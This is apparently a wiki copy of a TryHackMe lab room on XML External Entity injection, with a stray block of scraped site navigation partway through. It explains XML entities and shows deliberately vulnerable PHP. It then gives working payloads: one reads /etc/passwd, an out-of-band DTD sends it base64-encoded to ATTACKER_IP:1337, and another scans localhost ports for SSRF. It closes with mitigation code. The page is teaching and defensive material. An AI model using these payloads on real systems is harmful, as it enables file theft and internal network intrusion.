@@ -1,0 +1,406 @@
+<!--
+title: XXE Injections
+description: 
+published: true
+date: 2026-09-29T11:08:58.943Z
+tags: 
+editor: ckeditor
+dateCreated: 2026-09-29T11:08:58.943Z
+-->
+
+<h1>Introduction</h1>
+<p><strong>XXE (XML External Entity) injection</strong> is a type of security flaw that exploits vulnerabilities in an application's XML input. It occurs when an application accepts XML input that includes external entity references within the XML itself. Attackers can leverage this vulnerability to disclose local files, make server-side requests, or execute remote code.</p>
+<p>Given the widespread use of XML in web applications, particularly in web services and SOAP-based APIs, the severity of these vulnerabilities cannot be underestimated.</p>
+<h3>Objectives</h3>
+<ol>
+  <li>Recognize the fundamental concepts and dangers associated with XXE injection.</li>
+  <li>Identify vulnerable XML processing configurations and practices.</li>
+  <li>Develop techniques for detecting, exploiting, and mitigating XXE vulnerabilities in applications.</li>
+</ol>
+<h3>Prerequisites</h3>
+<ol>
+  <li>Knowledge of how XML documents are structured, including tags, attributes, and entity references.</li>
+  <li>Familiarity with how web applications process input and manage data.</li>
+  <li>Basic knowledge of OWASP ZAP or Burp Suite.</li>
+</ol>
+<h1>Exploring XML</h1>
+<h3>What is XML?</h3>
+<p>XML (Extensible Markup Language) is a markup language derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on. XML is typically used by applications to store and transport data in a format that's both human-readable and machine-parseable. It's a flexible and widely used format for exchanging data between different systems and applications. XML consists of elements, attributes, and character data, which are used to represent data in a structured and organized way.</p>
+<h3>XML Syntax and Structure</h3>
+<p>XML elements are represented by tags, which are surrounded by angle brackets (&lt;&gt;). Tags usually come in pairs, with the opening tag preceding the content and the closing tag following the content. For example:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;user id="1"&gt;
+   &lt;name&gt;John&lt;/name&gt;
+   &lt;age&gt;30&lt;/age&gt;
+   &lt;address&gt;
+      &lt;street&gt;123 Main St&lt;/street&gt;
+      &lt;city&gt;Anytown&lt;/city&gt;
+   &lt;/address&gt;
+&lt;/user&gt;
+</code></pre>
+<p>The tag <code>&lt;name&gt;John&lt;/name&gt;</code> represents an element named "name" with the content "John". Attributes provide additional information about elements and are specified within the opening tag. The tag <code>&lt;user id="1"&gt;</code> specifies an attribute "id" with the value "1" for the element "user". Character data refers to the content within elements, such as "John".</p>
+<p>The example above shows a simple XML document with elements, attributes, and character data. The tag <code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code> declaration indicates the XML version, and the element contains various sub-elements and attributes representing user data.</p>
+<h3>Common Use Cases in Web Applications</h3>
+<p>XML is widely used in web applications for data exchange, storage, and configuration. It's often used for web services and APIs, such as SOAP and REST, to exchange data between systems. XML is also used for configuration files, such as web server configurations or application settings.</p>
+<h3>What is XSLT?</h3>
+<p>XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and format XML documents. While XSLT is primarily used for data transformation and formatting, it is also significantly relevant to XXE (XML External Entities) attacks.</p>
+<p>XSLT can be used to facilitate XXE attacks in several ways:<br>&nbsp;</p>
+<ol>
+  <li><strong>Data Extraction</strong>: XSLT can be used to extract sensitive data from an XML document, which can then be used in an XXE attack. For example, an XSLT stylesheet can extract user credentials or other sensitive information from an XML file.</li>
+  <li><strong>Entity Expansion</strong>: XSLT can expand entities defined in an XML document, including external entities. This can allow an attacker to inject malicious entities, leading to an XXE vulnerability.</li>
+  <li><strong>Data Manipulation</strong>: XSLT can manipulate data in an XML document, potentially allowing an attacker to inject malicious data or modify existing data to exploit an XXE vulnerability.</li>
+  <li><strong>Blind XXE</strong>: XSLT can be used to perform blind XXE attacks, in which an attacker injects malicious entities without seeing the server's response.<br>&nbsp;</li>
+</ol>
+<h3>What are DTDs?</h3>
+<p>DTDs or Document Type Definitions define the structure and constraints of an XML document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within the XML document or external in a separate file.</p>
+<p>Purpose and usage of DTDs:</p>
+<ul>
+  <li><strong>Validation</strong>: DTDs validate the structure of XML to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.</li>
+  <li><strong>Entity Declaration</strong>: DTDs define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.<br>&nbsp;</li>
+</ul>
+<p>Internal DTDs are specified using the <code>&lt;!DOCTYPE</code> declaration, while external DTDs are referenced using the SYSTEM keyword.</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE config [
+&lt;!ELEMENT config (database)&gt;
+&lt;!ELEMENT database (username, password)&gt;
+&lt;!ELEMENT username (#PCDATA)&gt;
+&lt;!ELEMENT password (#PCDATA)&gt;
+]&gt;
+&lt;config&gt;
+&lt;!-- configuration data --&gt;
+&lt;/config&gt;
+</code></pre>
+<p>The example above shows an internal DTD defining the structure of a configuration file. The &lt;!ELEMENT declarations specify the allowed elements and their relationships.</p>
+<h3>DTDs and XXE</h3>
+<p>DTDs play a crucial role in XXE injection, as they can be used to declare external entities. External entities can reference external files or URLs, which can lead to malicious data or code injection.</p>
+<h3>XML Entities</h3>
+<p>XML entities are placeholders for data or code that can be expanded within an XML document. There are five types of entities: internal entities, external entities, parameter entities, general entities, and character entities.</p>
+<p>Example external entity:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!ENTITY external SYSTEM "http://example.com/test.dtd"&gt;
+&lt;config&gt;
+&amp;external;
+&lt;/config&gt;
+</code></pre>
+<p>This shows an external entity referencing a URL. The <code>&amp;external;</code> reference within the XML document will be expanded to the contents of the referenced URL.</p>
+<h3>Types of Entities</h3>
+<p>Internal Entities are essentially variables used within an XML document to define and substitute content that may be repeated multiple times. They are defined in the DTD (Document Type Definition) and can simplify the management of repetitive information. For example:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE note [
+&lt;!ENTITY inf "This is a test."&gt;
+]&gt;
+&lt;note&gt;
+        &lt;info&gt;&amp;inf;&lt;/info&gt;
+&lt;/note&gt;
+</code></pre>
+<p>In this example, the <code>&amp;inf;</code> entity is replaced by its value wherever it appears in the document.</p>
+<p>External Entities are similar to internal entities, but their contents are referenced from outside the XML document, such as from a separate file or URL. This feature can be exploited in XXE (XML External Entity) attacks if the XML processor is configured to resolve external entities. For example:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE note [
+&lt;!ENTITY ext SYSTEM "http://example.com/external.dtd"&gt;
+]&gt;
+&lt;note&gt;
+        &lt;info&gt;&amp;ext;&lt;/info&gt;
+&lt;/note&gt;
+</code></pre>
+<p>Here, <code>&amp;ext;</code> pulls content from the specified URL, which could be a security risk if the URL is controlled by an attacker.</p>
+<p>Parameter Entities are special types of entities used within DTDs to define reusable structures or to include external DTD subsets. They are particularly useful for modularizing DTDs and for maintaining large-scale XML applications. For example:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE note [
+&lt;!ENTITY % common "CDATA"&gt;
+&lt;!ELEMENT name (%common;)&gt;
+]&gt;
+&lt;note&gt;
+        &lt;name&gt;John Doe&lt;/name&gt;
+&lt;/note&gt;
+</code></pre>
+<p>In this case, <code>%common;</code> is used within the DTD to define the type of data that the <code>name</code> element should contain.</p>
+<p>General Entities are similar to variables and can be declared either internally or externally. They are used to define substitutions that can be used within the body of the XML document. Unlike parameter entities, general entities are intended for use in the document content. For example:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE note [
+&lt;!ENTITY author "John Doe"&gt;
+]&gt;
+&lt;note&gt;
+        &lt;writer&gt;&amp;author;&lt;/writer&gt;
+&lt;/note&gt;
+</code></pre>
+<p>The entity <code>&amp;author;</code> is a general entity used to substitute the author's name wherever it's referenced in the document.</p>
+<p>Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from misinterpreting XML syntax. For example:</p>
+<ul>
+  <li><code>&amp;lt;</code> for the less-than symbol (<code>&lt;</code>)</li>
+  <li><code>&amp;gt;</code> for the greater-than symbol (<code>&gt;</code>)</li>
+  <li><code>&amp;amp;</code> for the ampersand (<code>&amp;</code>)</li>
+</ul>
+<p>The image below shows the type of entities in a DOM structure:</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716545852309" alt="Types of entities in DOM structure"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p style="text-align:center;"><i>source:&nbsp;https://learn.microsoft.com/en-us/dotnet/standard/data/xml/reading-entity-declarations-and-entity-references-into-the-dom</i></p>
+<h1>XML Parsing mechanisms</h1>
+<h3>XML Parsing</h3>
+<p>XML parsing is the process by which an XML file is read, and its information is accessed and manipulated by a software program. XML parsers convert data from XML format into a structure that a program can use (like a DOM tree). During this process, parsers may validate XML data against a schema or a DTD, ensuring the structure conforms to certain rules.</p>
+<p>If a parser is configured to process external entities, it can lead to unauthorized access to files, internal systems, or external websites.</p>
+<h3>Common XML Parsers</h3>
+<p>Several XML parsers are used across different programming environments; each parser may handle XML data differently, which can affect vulnerability to XXE injection.</p>
+<ul>
+  <li><strong>DOM (Document Object Model) Parser</strong>: This method builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.</li>
+  <li><strong>SAX (Simple API for XML) Parser</strong>: Parses XML data sequentially without loading the whole document into memory, making it suitable for large XML files. However, it is less flexible for accessing XML data randomly.</li>
+  <li><strong>StAX (Streaming API for XML) Parser</strong>: Similar to SAX, StAX parses XML documents in a streaming fashion but gives the programmer more control over the XML parsing process.</li>
+  <li><strong>XPath Parser</strong>: Parses an XML document based on expression and is used extensively in conjunction with XSLT.</li>
+</ul>
+<h1>XXE exploiting in-band</h1>
+<figure class="image"><img src="https://tryhackme.com/_next/static/immutable/media/TryHackMe_MAX_logo.0sbg-835dve-v.svg" alt="TryHackMe logo." srcset="/_next/static/immutable/media/TryHackMe_MAX_logo.0sbg-835dve-v.svg" sizes="100vw"></figure>
+<p><a href="https://tryhackme.com/dashboard">Dashboard</a></p>
+<p><a href="https://tryhackme.com/hacktivities">Learn</a></p>
+<p>Practice</p>
+<p>Compete</p>
+<p>Develop</p>
+<p>&nbsp;</p>
+<p>1</p>
+<p>&nbsp;</p>
+<p>69</p>
+<p>1</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-avatars/0ebd4ada902d898feeed3315211ab47a.jpg" alt="User profile photo."></figure>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/44ee1fd9662a1301d952521f9d98df24.png" alt=""></figure>
+<ul>
+  <li><a href="https://tryhackme.com/paths">Web Application Pentesting</a></li>
+  <li><a href="https://tryhackme.com/module/injection-attacks">Injection Attacks</a></li>
+  <li>XXE Injection</li>
+</ul>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1718412174374" alt="Room Icon"></figure>
+<h1>XXE Injection</h1>
+<p>Premium room</p>
+<p>Exploiting XML External Entities.</p>
+<p>medium</p>
+<figure class="image"><img src="https://tryhackme.com/_next/static/immutable/media/avatar.1mdgej057w749.png" alt="User profile photo."></figure>
+<p>60 min</p>
+<p>13,887</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-avatars/af7feb2c43a2c7d5f111b98ccbd15048.png" alt="User profile photo."></figure>
+<figure class="image"><img src="https://secure.gravatar.com/avatar/8110073ead81bd5ce12c5a956b18af06.jpg?s=200&amp;d=robohash&amp;r=x" alt="User profile photo."></figure>
+<p>Share with your colleague</p>
+<p>Start AttackBox</p>
+<p>Save Room304 RecommendConnectivityVPNOptions</p>
+<p>Room completed: 100%</p>
+<p>Task 1Introduction</p>
+<p>&nbsp;</p>
+<p>Task 2Exploring XML</p>
+<p>&nbsp;</p>
+<p>Task 3XML Parsing Mechanisms</p>
+<p>&nbsp;</p>
+<p>Task 4Exploiting XXE - In-Band</p>
+<p>&nbsp;</p>
+<h3>In-Band vs Out-of-Band XXE</h3>
+<p>In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.</p>
+<p>Out-of-band XXE, on the other hand, refers to an XXE vulnerability where the attacker cannot see the response from the server. This requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data. To extract the data, the attacker must craft a malicious XML payload that will trigger an out-of-band request, such as a DNS query or an HTTP request.</p>
+<h3>In-Band XXE Exploitation</h3>
+<p>We will be using <a href="https://tryhackme.com/module/learn-burp-suite">Burp</a> for this room. To demonstrate this vulnerability, go to <a href="http://MACHINE_IP/contact.php">http://MACHINE_IP/contact.php (opens in new tab)</a>, and fill out&nbsp;the form.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/db8f3f703dd6b8641d5555ed6ead1b49.png" alt="Homepage of the application"></figure>
+<p><br>&nbsp;</p>
+<p>Click the submit button and intercept the request.</p>
+<figure class="image image_resized" style="width:90%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/734c868f5e54ae3b3d0c3539301f2256.png" alt="Intercepted request of the contact form"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>The submitted data is processed by contact_submit.php, which contains a vulnerable PHP code designed to return the value of the name parameter when a user submits a message in the form. Below is the vulnerable code:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">libxml_disable_entity_loader(false);
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $xmlData = file_get_contents('php://input');
+
+    $doc = new DOMDocument();
+    $doc-&gt;loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 
+
+    $expandedContent = $doc-&gt;getElementsByTagName('name')[0]-&gt;textContent;
+
+    echo "Thank you, " .$expandedContent . "! Your message has been received.";
+}
+</code></pre>
+<p>Since the application returns the value of the name parameter, we can inject an entity that is pointing to <code>/etc/passwd</code> to disclose its values.</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;contact&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;email&gt;test@test.com&lt;/email&gt;
+&lt;message&gt;test&lt;/message&gt;
+&lt;/contact&gt;
+</code></pre>
+<p>Using the payload above, replace the initial XML data submitted to contact_submit.php and resend the request.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2f5c2d1f8e4c04b03daa1240463e7580.png" alt="Injected xxe payload pointed to /etc/passwd file"></figure>
+<p><br>&nbsp;</p>
+<h3>XML Entity Expansion</h3>
+<p>XML Entity Expansion is a technique often used in XXE attacks that involves defining entities within an XML document, which the XML parser then expands. Attackers can abuse this feature by creating recursive or excessively large entities, leading to a Denial of Service (DoS) attack or defining external entities referencing sensitive files or services. This method is central to both in-band and out-of-band XXE, as it allows attackers to inject malicious entities into the XML data. For example:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe "This is a test message" &gt;]&gt;
+&lt;contact&gt;&lt;name&gt;&amp;xxe; &amp;xxe;
+&lt;/name&gt;&lt;email&gt;test@test.com&lt;/email&gt;&lt;message&gt;test&lt;/message&gt;&lt;/contact&gt;
+</code></pre>
+<p>In the payload above, <code>&amp;xxe;</code> is expanded wherever it appears. Attackers can use entity expansion to perform a Billion Laughs attack, where a small XML document recursively expands to consume server resources, leading to a denial of service.</p>
+<figure class="image image_resized" style="width:90%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3e45b26afe9371b2061afbdba33ea3ce.png" alt="XML Expansion in action"></figure>
+<h1 style="text-align:center;">&nbsp;</h1>
+<h1>Exploiting XXE out of band</h1>
+<h3>Out-Of-Band XXE</h3>
+<p>On the other hand, to demonstrate this vulnerability, go to <a href="http://MACHINE_IP/index.php">http://MACHINE_IP/index.php (opens in new tab)</a>. The application uses the below code when a user uploads a file:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">libxml_disable_entity_loader(false);
+$xmlData = file_get_contents('php://input'); 
+
+$doc = new DOMDocument();
+$doc-&gt;loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
+
+$links = $doc-&gt;getElementsByTagName('file');
+
+foreach ($links as $link) {
+    $fileLink = $link-&gt;nodeValue;
+    $stmt = $conn-&gt;prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
+    $stmt-&gt;bind_param("s", $fileLink);
+    $stmt-&gt;execute();
+    
+    if ($stmt-&gt;affected_rows &gt; 0) {
+        echo "Link saved successfully.";
+    } else {
+        echo "Error saving link.";
+    }
+    
+    $stmt-&gt;close();
+}
+</code></pre>
+<p>The code above doesn't return the values of the submitted XML data. Hence, the term Out-of-Band since the exfiltrated data has to be captured using an attacker-controlled server.</p>
+<p>For this attack, we will need a server that will receive data from other servers. You can use Python's http.server module, although there are options out there, like Apache or Nginx. Using AttackBox or your own machine, start a Python web server by using the command:</p>
+<p>&nbsp;</p>
+<p>Starting a Python Webserver</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<code>user@tryhack $ python3 -m http.server 1337
+    Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...</code>
+  &nbsp; &nbsp; &nbsp; &nbsp;</p>
+<p>Upload a file in the application and monitor the request that is sent to <code>submit.php</code> using your Burp. Forward the request below to Burp Repeater.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0ac465ae50933198b249c9e622cb8d9d.png" alt="Forward the request to repeater"></figure>
+<p><br>&nbsp;</p>
+<p>Using the payload below, replace the value of the XML file in the request and resend it. Note that you have to replace the ATTACKER_IP variable with your own IP.</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" &gt;]&gt;
+&lt;upload&gt;&lt;file&gt;&amp;xxe;&lt;/file&gt;&lt;/upload&gt;
+</code></pre>
+<p>Send the modified HTTP request.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/08cbba233f61b8bc17e166c089931bd6.png" alt="Modified HTTP request with the payload"></figure>
+<p><br>&nbsp;</p>
+<p>After sending the modified HTTP request, the Python web server will receive a connection from the lab machine. The establishment of a connection with the server indicates that sensitive information can be extracted from the application.</p>
+<figure class="image image_resized" style="width:50%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8cfa02d850cc73372dd6993acd9265fd.png" alt="Python webserver receives a connection"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>We can now create a DTD file that contains an external entity with a PHP filter to exfiltrate data from the target web application.</p>
+<p>Save the sample DTD file below and name it as <code>sample.dtd</code>. The payload below will exfiltrate the contents of <code>/etc/passwd</code> and send the response back to the attacker-controlled server:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
+&lt;!ENTITY % oobxxe "&lt;!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'&gt;"&gt;
+%oobxxe;
+</code></pre>
+<p><strong>DTD Payload Explained</strong></p>
+<p>The DTD begins with a declaration of an entity <code>%cmd</code> that points to a system resource. The&nbsp;<code><strong>%cmd</strong></code><strong> </strong>entity refers to a resource within the PHP filter protocol <code>php://filter/convert.base64-encode/resource=/etc/passwd</code>. It retrieves the content of <code>/etc/passwd</code>, a standard file in Unix-based systems containing user account information. The <code>convert.base64-encode</code> filter encodes the content in Base64 format to avoid formatting problems. The <code><strong>%oobxxe</strong></code><strong> </strong>entity contains another XML entity declaration, <code>exfil</code>, which has a system identifier pointing to the attacker-controlled server. It includes a parameter named data with&nbsp;<code>%cmd</code>, representing the Base64-encoded content of <code>/etc/passwd</code>.&nbsp;When <code>%oobxxe;</code> is parsed, it creates the <code>exfil</code> entity that connects to an attacker's server (<code>http://ATTACKER_IP:1337/</code>). The parameter <code>?data=%cmd</code> sends the Base64-encoded content from <code>%cmd</code>.</p>
+<p>Go back to the repeater and change your payload to:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd"&gt;
+&lt;upload&gt;
+    &lt;file&gt;&amp;exfil;&lt;/file&gt;
+&lt;/upload&gt;
+</code></pre>
+<p>&nbsp;</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2e5178fb66945cbbb4e855d013690c9c.png" alt="Change the payload to the updated external DTD file"></figure>
+<p><br>&nbsp;</p>
+<p>Resend the request and check your terminal. You will receive two (2) requests. The first is the request for the sample.dtd file, and the second is the request sent by the vulnerable application containing the encoded /etc/passwd.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/9c87f37b1fed79110958f8cdfc492c93.png" alt="Two external connections received in the webserver with the exfiltrated data"></figure>
+<p>Decoding the exfiltrated base64 data will show that it contains the base64 value of /etc/passwd.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/4ea510718c602ecaa7de8357599e8ab3.png" alt="Decoded version of the exfiltrated data"></figure>
+<h1>SSRF and XXE</h1>
+<p><strong>Server-Side Request Forgery (SSRF)</strong> attacks occur when an attacker abuses functionality on a server, causing the server to make requests to an unintended location. In the context of XXE, an attacker can manipulate XML input to make the server issue requests to internal services or access internal files. This technique can be used to scan internal networks, access restricted endpoints, or interact with services that are only accessible from the server’s local network.</p>
+<h3>Internal Network Scanning</h3>
+<p>Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.</p>
+<p>For example, using the captured request from the in-band XXE task, send the captured request to Burp Intruder and use the payload below:</p>
+<p>&nbsp;</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM "http://localhost:§10§/" &gt;
+]&gt;
+&lt;contact&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/contact&gt;
+</code></pre>
+<p>The external entity is set to fetch data from <code>http://localhost:§10§/</code>. Intruder will then reiterate the request and search for an internal service running on the server.</p>
+<p><strong>Steps to brute force for open ports:</strong></p>
+<p>1. Once the captured request from the In-Band XXE is in Intruder, click the Add&nbsp;<code>§</code> button while highlighting the port.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/593a4fc9649f7eb2fec803104b3a897b.png" alt="HTTP request in intruder"></figure>
+<p><br>&nbsp;</p>
+<p>2. In the Payloads tab, set the payload type to Numbers with the Payload settings from 1 to 65535.</p>
+<figure class="image image_resized" style="width:100%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/e5358d3d6bde1dda471a34d9e207598e.png" alt="Payloads tab with the right settings"></figure>
+<p>3. Once done, click the Start attack button and click the Length column to sort which item has the largest size. The difference in the server's response size is worth further investigation since it might contain information that is different compared to the other intruder requests.</p>
+<figure class="image image_resized" style="width:90%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6f184ed4700daf4859c6d4314a0205f5.png" alt="Successful attack showing the data"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<figure class="image image_resized" style="width:90%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/634833be32484b2bfeb5761d3de57611.png" alt="Flag in the response"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p><strong>How the Server Processes This</strong>:</p>
+<p>The entity&nbsp;<code>&amp;xxe;</code>&nbsp;is referenced within the&nbsp;<code>&lt;name&gt;</code>&nbsp;tag, triggering the server to make an HTTP request to the specified URL when the XML is parsed. The response of the requested resource will then be included in the server response. If an application contains secret keys, API keys, or hardcoded passwords, this information can then be used in another form of attack, such as password reuse.</p>
+<h3>Potential Security Implications</h3>
+<ul>
+  <li><strong>Reconnaissance</strong>: Attackers can discover services running on internal network ports and gain insights into the server's internal architecture.</li>
+  <li><strong>Data Leakage</strong>: If the internal service returns sensitive information, it could be exposed externally through errors or XML data output.</li>
+  <li><strong>Elevation of Privilege</strong>: Accessing internal services could lead to further exploits, potentially escalating an attacker's capabilities within the network.</li>
+</ul>
+<h1>Mitigation</h1>
+<h3>Avoiding Misconfigurations</h3>
+<p>Misconfigurations in XML parser settings are a common cause of XXE-related vulnerabilities. Adjusting these settings can significantly reduce the risk of XXE attacks. Below are detailed guidelines and best practices for several popular programming languages and frameworks.</p>
+<h3>General Best Practices</h3>
+<ol>
+  <li><strong>Disable External Entities and DTDs</strong>: As a best practice, disable the processing of external entities and DTDs in your XML parsers. Most XXE vulnerabilities arise from malicious DTDs.</li>
+  <li><strong>Use Less Complex Data Formats</strong>: Where possible, consider using simpler data formats like JSON, which do not allow the specification of external entities.</li>
+  <li><strong>Allowlisting Input Validation</strong>: Validate all incoming data against a strict schema that defines expected data types and patterns.&nbsp;Exclude or escape XML-specific characters such as &lt;, &gt;, &amp;, ', and ". These characters are crucial in XML syntax and can lead to injection attacks if misused.</li>
+</ol>
+<h3>Mitigation Techniques in Popular Languages</h3>
+<p><strong>Java</strong></p>
+<p>Use the <code>DocumentBuilderFactory</code> and disable DTDs:</p>
+<p>&nbsp;</p>
+<pre><code class="language-java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+DocumentBuilder db = dbf.newDocumentBuilder();
+</code></pre>
+<p><strong>.NET</strong></p>
+<p>Configure XML readers to ignore DTDs and external entities:</p>
+<p>&nbsp;</p>
+<pre><code class="language-plaintext">XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;
+settings.XmlResolver = null;
+XmlReader reader = XmlReader.Create(stream, settings);
+</code></pre>
+<p><strong>PHP</strong></p>
+<p>Disable loading external entities by libxml:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">libxml_disable_entity_loader(true);
+</code></pre>
+<p><strong>Python</strong></p>
+<p>Use <code>defusedxml</code> library, which is designed to mitigate XML vulnerabilities:</p>
+<p>&nbsp;</p>
+<pre><code class="language-python">from defusedxml.ElementTree import parse
+et = parse(xml_input)
+</code></pre>
+<h3>Regularly Update and Patch</h3>
+<ul>
+  <li><strong>Software Updates</strong>: Keep all XML processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.</li>
+  <li><strong>Security Patches</strong>: Regularly apply security patches to web applications and their environments.</li>
+</ul>
+<h3>Security Awareness and Code Reviews</h3>
+<ul>
+  <li><strong>Conduct Code Reviews</strong>: Regularly review code for security vulnerabilities, especially code that handles XML input and parsing.</li>
+  <li><strong>Promote Security Training</strong>: Ensure developers are aware of secure coding practices, including the risks associated with XML parsing.</li>
+</ul>
+<p>&nbsp;</p>
